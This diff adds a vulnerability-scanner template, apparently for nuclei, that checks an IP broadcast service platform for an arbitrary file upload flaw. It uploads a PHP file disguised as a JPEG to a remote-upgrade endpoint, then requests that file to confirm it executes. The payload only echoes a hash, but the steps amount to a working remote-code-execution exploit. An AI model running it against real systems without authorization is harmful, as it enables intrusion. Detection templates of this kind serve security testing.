@@ -1,0 +1,54 @@
+id: poc-yaml-itc-upload-anyfile-upload
+info:
+  name: IP网络广播服务平台 upload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/api/v2/remote-upgrade/upload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarytiZYyyKkbwCxtHC1"
+    body: |-
+      ------WebKitFormBoundarytiZYyyKkbwCxtHC1
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundarytiZYyyKkbwCxtHC1--
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'relative_path')"
+    extractors:
+      - type: regex
+        name: uploaded_file
+        internal: true
+        group: 1
+        regex:
+          - "(?P<file>[0-9a-z]{32}).php"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/uploads/remote_upgrade/{{uploaded_file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
